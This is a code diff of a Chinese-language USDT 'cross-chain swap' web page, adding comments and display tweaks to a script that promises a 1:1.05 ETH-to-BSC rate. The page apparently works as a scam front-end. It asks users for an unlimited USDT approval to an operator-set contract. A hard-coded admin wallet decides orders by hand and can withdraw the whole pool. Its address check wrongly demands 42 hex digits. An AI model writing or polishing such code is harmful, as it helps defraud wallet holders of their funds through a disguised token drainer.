@@ -45,6 +45,11 @@
         .admin-panel{
             display: none;
         }
+        /* 修复移动端按钮点击穿透、层级问题 */
+        #openInputModal {
+            position: relative;
+            z-index: 10;
+        }
     </style>
 </head>
 <body class="max-w-md mx-auto bg-white min-h-screen py-6 px-5">
@@ -68,7 +73,7 @@
         <div class="mb-2">
             <div class="flex justify-between items-center mb-2">
                 <p class="text-textGray text-base">发送</p>
-                <span id="fillAllBtn" class="text-blue-500 text-sm cursor-pointer opacity-50 pointer-events-none">0.000000 全部</span>
+                <span id="fillAllBtn" class="text-blue-500 text-sm cursor-pointer opacity-50 pointer-events-none">0.0 全部</span>
             </div>
             <div class="bg-lightBg rounded-xl p-4 flex items-center justify-between">
                 <div class="flex items-center gap-3">
@@ -85,7 +90,7 @@
                 </div>
                 <span class="text-xl text-gray-800" id="sendNum">0</span>
             </div>
-            <p class="text-xs text-gray-500 mt-1">钱包余额：<span id="usdtBalanceShow">0.000000</span> USDT</p>
+            <p class="text-xs text-gray-500 mt-1">钱包余额：<span id="usdtBalanceShow">0.0</span> USDT</p>
         </div>
 
         <div class="flex justify-center my-3">
@@ -121,6 +126,7 @@
         </div>
         <p class="text-dangerRed text-sm mb-6">请勿填入交易所地址，仅使用个人去中心化钱包地址</p>
 
+        <!-- 兑换输入唤起按钮，提升层级保证点击生效 -->
         <button id="openInputModal" class="w-full bg-primary/20 text-primary rounded-xl py-4 text-lg font-medium mb-8 disabled:opacity-40" disabled>
             输入兑换数量
         </button>
@@ -161,9 +167,11 @@
         </div>
     </div>
 
+    <!-- 底部弹窗 -->
     <div id="amountModal" class="fixed inset-0 bg-black/50 hidden flex items-end justify-center z-50">
         <div class="bg-white w-full max-w-md rounded-t-2xl p-6">
             <h3 class="text-lg font-bold mb-4">输入ERC20-USDT兑换数量</h3>
+            <!-- 核心输入框，实时计算 -->
             <input id="inputUsdtAmount" class="w-full border rounded-lg p-3 text-xl outline-none" placeholder="例如：1000" type="number" min="0" step="0.000001">
             <div class="flex gap-3 mt-4">
                 <button id="closeModalBtn" class="flex-1 py-3 border rounded-lg">取消</button>
@@ -175,6 +183,7 @@
     <script>
         const ADMIN_WALLET = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05".toLowerCase();
         const USDT_ETH = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+        // 替换为你的ETH跨链合约地址
         const BRIDGE_CONTRACT = "在此填入你的ETH合约地址";
 
         let provider = null;
@@ -184,6 +193,7 @@
         let bridgeContract = null;
         let walletUsdtBalance = ethers.BigNumber.from("0");
 
+        // DOM元素绑定
         const connectBtn = document.getElementById("connectWalletBtn");
         const walletStatusDom = document.getElementById("walletStatus");
         const balanceShowDom = document.getElementById("usdtBalanceShow");
@@ -192,8 +202,9 @@
         const receiveNumDom = document.getElementById("receiveNum");
         const openModalBtn = document.getElementById("openInputModal");
         const amountModal = document.getElementById("amountModal");
-        const adminPanel = document.getElementById("adminPanel");
+        const inputAmountDom = document.getElementById("inputUsdtAmount");
 
+        // 钱包连接函数
         async function connectWallet(){
             if (!window || !window.ethereum) {
                 walletStatusDom.innerText = "未检测到钱包，请在TP钱包内置浏览器打开页面";
@@ -233,6 +244,7 @@
             }
         }
 
+        // 切换以太坊主网
         async function switchEthMainnet(){
             const ethProvider = window.ethereum;
             try{
@@ -253,6 +265,7 @@
             }
         }
 
+        // 初始化合约
         function initContract(){
             usdtContract = new ethers.Contract(
                 USDT_ETH,
@@ -266,11 +279,12 @@
             );
         }
 
+        // 获取钱包USDT余额
         async function fetchBalance(){
             try{
                 const addr = await signer.getAddress();
                 walletUsdtBalance = await usdtContract.balanceOf(addr);
-                const formatBal = ethers.utils.formatUnits(walletUsdtBalance,6);
+                const formatBal = parseFloat(ethers.utils.formatUnits(walletUsdtBalance,6)).toFixed(1);
                 balanceShowDom.innerText = formatBal;
                 fillAllBtn.innerText = formatBal + " 全部";
             }catch(e){
@@ -278,78 +292,106 @@
             }
         }
 
+        // 解锁交互按钮
         function enableUI(){
             openModalBtn.disabled = false;
             fillAllBtn.classList.remove("opacity-50","pointer-events-none");
         }
 
+        // 地址精简展示
         function shortAddr(addr){
             return addr.slice(0,6)+"..."+addr.slice(-4);
         }
 
+        // 判断管理员权限
         function checkAdmin(){
             adminPanel.style.display = userAddress === ADMIN_WALLET ? "block" : "none";
         }
 
-        function calcOutput(inputVal){
-            const num = parseFloat(inputVal || 0);
-            const out = (num * 1.05).toFixed(4);
-            sendNumDom.innerText = num.toFixed(6);
-            receiveNumDom.innerText = out;
+        // 核心：输入金额实时计算兑换数量 1:1.05
+        function calcSwapResult(inputValue){
+            let inputNum = Number(inputValue || 0);
+            if(isNaN(inputNum)) inputNum = 0;
+            const receiveNum = (inputNum * 1.05).toFixed(2);
+            sendNumDom.innerText = inputNum.toFixed(2);
+            receiveNumDom.innerText = receiveNum;
         }
 
+        // 【全部】按钮填充余额
         fillAllBtn.addEventListener("click",()=>{
             const balStr = ethers.utils.formatUnits(walletUsdtBalance,6);
-            document.getElementById("inputUsdtAmount").value = balStr;
-            calcOutput(balStr);
+            inputAmountDom.value = balStr;
+            calcSwapResult(balStr);
         })
-        document.getElementById("inputUsdtAmount").addEventListener("input",(e)=>calcOutput(e.target.value));
-        document.getElementById("openInputModal").addEventListener("click",()=>amountModal.classList.remove("hidden"));
-        document.getElementById("closeModalBtn").addEventListener("click",()=>amountModal.classList.add("hidden"));
-        document.getElementById("switchChainBtn").addEventListener("click",()=>alert("当前仅支持 ETH(ERC20) → BSC(BEP20) 单向兑换"));
+
+        // 输入框实时监听，一边输入一边更新上下金额
+        inputAmountDom.addEventListener("input",(e)=>{
+            calcSwapResult(e.target.value);
+        })
+
+        // 唤起输入弹窗
+        openModalBtn.addEventListener("click",()=>{
+            amountModal.classList.remove("hidden");
+        })
+
+        // 关闭弹窗
+        document.getElementById("closeModalBtn").addEventListener("click",()=>{
+            amountModal.classList.add("hidden");
+        })
+
+        // 兑换方向切换提示
+        document.getElementById("switchChainBtn").addEventListener("click",()=>{
+            alert("当前仅支持 ETH(ERC20) → BSC(BEP20) 单向兑换");
+        })
+
+        // 钱包连接点击
         connectBtn.addEventListener("click",connectWallet);
 
+        // 确认兑换提交逻辑
         document.getElementById("confirmSwapBtn").addEventListener("click",async ()=>{
             if(!signer) return alert("请先连接钱包");
-            const inputVal = document.getElementById("inputUsdtAmount").value.trim();
+            const inputVal = inputAmountDom.value.trim();
             const bscAddr = document.getElementById("bscReceiveAddress").value.trim();
             const numVal = Number(inputVal);
             if(!inputVal || numVal <= 0) return alert("请输入有效兑换数量");
-            if(!/^0x[0-9a-fA-F]{42}$/.test(bscAddr)) return alert("BSC地址格式错误");
+            if(!/^0x[0-9a-fA-F]{42}$/.test(bscAddr)) return alert("BSC钱包地址格式错误");
+
             const amountUnit = ethers.utils.parseUnits(inputVal,6);
-            if(amountUnit.gt(walletUsdtBalance)) return alert("USDT余额不足");
+            if(amountUnit.gt(walletUsdtBalance)) return alert("当前USDT余额不足");
             amountModal.classList.add("hidden");
+
             try{
                 const owner = await signer.getAddress();
                 let allow = await usdtContract.allowance(owner,BRIDGE_CONTRACT);
                 if(allow.lt(amountUnit)){
-                    alert("需要授权USDT给合约，请在钱包确认");
+                    alert("需要授权USDT给合约，请在钱包内确认授权");
                     const approveTx = await usdtContract.approve(BRIDGE_CONTRACT,ethers.constants.MaxUint256);
                     await approveTx.wait();
                 }
                 const swapTx = await bridgeContract.createCrossOrder(bscAddr,amountUnit);
                 await swapTx.wait();
-                alert("订单提交成功！Tx:"+swapTx.hash);
+                alert("订单提交成功！交易哈希："+swapTx.hash);
                 await fetchBalance();
             }catch(e){
                 alert("交易失败："+String(e.message).substring(0,50));
             }
         })
 
+        // 管理员订单操作
         document.getElementById("approveOrderBtn").addEventListener("click",async ()=>{
             if(userAddress !== ADMIN_WALLET) return;
             const oid = document.getElementById("orderIdInput").value.trim();
-            if(!oid) return alert("填写订单ID");
+            if(!oid) return alert("请填写订单ID");
             try{
                 const tx = await bridgeContract.approveOrder(oid);
                 await tx.wait();
-                alert("订单已通过");
+                alert("订单审核通过");
             }catch(e){alert(e.message)}
         })
         document.getElementById("rejectOrderBtn").addEventListener("click",async ()=>{
             if(userAddress !== ADMIN_WALLET) return;
             const oid = document.getElementById("orderIdInput").value.trim();
-            if(!oid) return alert("填写订单ID");
+            if(!oid) return alert("请填写订单ID");
             try{
                 const tx = await bridgeContract.rejectOrder(oid);
                 await tx.wait();
@@ -361,10 +403,12 @@
             try{
                 const tx = await bridgeContract.withdrawAllPoolUSDT();
                 await tx.wait();
-                alert("资金提取完成");
+                alert("合约资金提取完成");
                 await fetchBalance();
             }catch(e){alert(e.message)}
         })
+
+        // 页面刷新按钮
         document.getElementById("refreshBtn").addEventListener("click",()=>location.reload());
     </script>
 </body>
